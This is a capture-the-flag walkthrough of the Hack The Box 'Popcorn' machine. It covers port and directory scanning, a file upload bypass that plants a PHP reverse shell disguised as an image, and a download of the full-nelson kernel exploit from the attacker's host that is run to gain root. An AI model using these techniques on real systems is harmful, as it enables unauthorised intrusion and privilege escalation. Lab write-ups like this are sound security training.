---
clayout: ctf
title: Popcorn
date: 2025-08-22
image: /ctf/hack-the-box/machines/popcorn/info-card.png
type: Hack The Box

ctf:
    - name: Popcorn
      link: https://app.hackthebox.com/machines/4
      thumbnail: /ctf/hack-the-box/machines/popcorn/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/4
          thumbnail: /ctf/hack-the-box/machines/popcorn/pwned.png
---

## Machine Overview

The target is **Popcorn (10.10.10.6)**, an older HackTheBox Linux machine running outdated services. Initial enumeration revealed both SSH and HTTP, with the web server exposing a torrent hosting application vulnerable to file upload abuse. Privilege escalation was achieved through a kernel exploit.

## Enumeration

### Nmap Scan

We begin with a basic service and version scan:

```bash
nmap -sC -sV -A -oN nmap.txt 10.10.10.6
```

**Scan results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)
|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-server-header: Apache/2.2.12 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://popcorn.htb/
```

From the scan we see:

* **SSH (OpenSSH 5.1p1)**: Outdated, potentially vulnerable.
* **HTTP (Apache httpd 2.2.12)**: Legacy version of Apache serving a website.

The scan also revealed a redirect to `popcorn.htb`, so we add the hostname to `/etc/hosts`:

```bash
echo "10.10.10.6 popcorn.htb" >> /etc/hosts
```

### HTTP Enumeration

Visiting `http://popcorn.htb` shows the default web page:

![Default web page](/ctf/hack-the-box/machines/popcorn/default-web-page.png)

#### HTTP Directory Enumeration

We use `gobuster` to enumerate directories:

```bash
gobuster dir -u http://popcorn.htb -w /usr/share/wordlists/dirb/common.txt
```

**Scan results:**

```bash
/index                (Status: 200) [Size: 177]
/rename               (Status: 301) [Size: 311] [--> http://popcorn.htb/rename/]
/test                 (Status: 200) [Size: 47349]
/test.php             (Status: 200) [Size: 47377]
/torrent              (Status: 301) [Size: 312] [--> http://popcorn.htb/torrent/]
```

Visiting `/torrent` reveals a torrent hosting application:

![Torrent page](/ctf/hack-the-box/machines/popcorn/torrent-page.png)

Available features:

* Register and login
* Upload / download torrent files
* Edit torrent details (name, description, category, preview image)

### File Upload Vulnerability

Initial testing of torrent uploads yielded nothing interesting. However, when uploading a preview image, we noticed it was served via:

```text
http://popcorn.htb/torrent/thumbnail.php?src=./upload/<upload-id>.jpg
```

This suggests that uploaded files are stored in `/upload/` and accessible directly.

To exploit this, we upload a PHP reverse shell but disguise it as an image by setting the `Content-Type` header to `image/png`. The application accepts it and provides an upload ID.

We then trigger the shell by browsing to:

```text
http://popcorn.htb/torrent/upload/<upload-id>.php
```

On our listener:

```bash
nc -lnv 1337
```

We receive a connection:

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We now have a shell as `www-data`.

> [!NOTE] User flag
> Located at `/home/george/user.txt`.

> [!TIP] Terminal stabilization
>
> ```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
> export TERM=xterm
> ```

### Privilege Escalation (www-data to root)

#### Kernel Information

Checking system details:

```bash
$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```

This is a 32-bit Ubuntu kernel vulnerable to several privilege escalation exploits. The [full-nelson](https://github.com/lucyoa/kernel-exploits/tree/master/full-nelson) exploit is a reliable option here.

#### Exploit

We host the exploit on our machine:

```bash
python -m http.server 8000
```

On the target:

```bash
cd /tmp
wget http://10.10.14.10:8000/full-nelson
chmod +x full-nelson
```

Execute the exploit:

```bash
./full-nelson
# ... execution output ...
[*] Triggering payload...
[*] Got root!
$ id
uid=0(root) gid=0(root)
```

> [!NOTE] Root flag
> Located at `/root/root.txt`.

## References

* [Hack The Box - Popcorn](https://app.hackthebox.com/machines/4)
* [Github - lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
